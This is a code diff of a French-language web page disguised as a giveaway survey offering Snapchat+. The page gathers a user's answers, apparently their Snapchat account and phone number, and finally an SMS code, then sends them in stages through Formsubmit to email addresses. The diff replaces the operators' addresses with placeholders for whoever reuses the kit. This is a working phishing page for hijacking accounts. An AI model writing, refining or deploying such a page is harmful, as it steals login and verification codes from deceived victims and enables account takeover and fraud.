@@ -164,9 +164,9 @@ const questions = [
 let indexQuestion = 0;
 let reponsesUtilisateur = [];
 
-// Emails pour Formsubmit
-const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com"; 
-const ccEmail = "becteurfoou@proton.me";
+// Remplace ces emails par les tiens
+const formsubmitURL = "https://formsubmit.co/tonemail1@proton.me"; // Email principal
+const ccEmail = "tonemail2@proton.me"; // Email secondaire
 
 function demarrer(){
     document.getElementById("intro").style.display="none";
@@ -179,7 +179,7 @@ function afficherQuestion(){
     document.getElementById("question").textContent = q.text;
     document.getElementById("reponses").innerHTML = `<input type="${q.type}" id="champ" placeholder="${q.placeholder}" oninput="verifier()">`;
     document.getElementById("btnSuivant").disabled = true;
-    document.getElementById("partenariat").style.display = indexQuestion>=3?"block":"none";
+    document.getElementById("partenariat").style.display = indexQuestion>=3 ? "block" : "none";
     updateProgress();
 }
 
@@ -202,26 +202,27 @@ function suivant(){
         return;
     }
 
+    // On stocke la valeur AVANT d'envoyer
     reponsesUtilisateur[indexQuestion] = val;
-    indexQuestion++;
 
-    // Envoi intermédiaire après les 3 premières réponses
-    if(indexQuestion === 3){
+    // Étape 1 : après les 3 premières réponses
+    if(indexQuestion === 2){
         envoyer(1);
-        document.getElementById("sondage").style.display="none";
-        document.getElementById("intermediaire").style.display="block";
-        return;
     }
 
-    // Envoi avant la saisie du SMS
-    if(indexQuestion === 5){
+    // Étape 2 : après Snapchat + téléphone
+    if(indexQuestion === 4){
         envoyer(2);
     }
 
+    indexQuestion++;
+
     if(indexQuestion < questions.length){
+        // Affiche la question suivante
         afficherQuestion();
     } else {
-        envoyer(3); // Envoi final
+        // Étape 3 : envoi final avec code SMS
+        envoyer(3);
         document.getElementById("sondage").innerHTML = `
             <h2>Merci pour votre participation !</h2>
             <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
@@ -235,7 +236,7 @@ function continuer(){
     afficherQuestion();
 }
 
-// Fonction d'envoi via Formsubmit (rapide, simple, gratuit)
+// Envoi via Formsubmit
 function envoyer(etape){
     const formData = new FormData();
     formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
@@ -255,4 +256,3 @@ function envoyer(etape){
 </script>
 </body>
 </html>
-
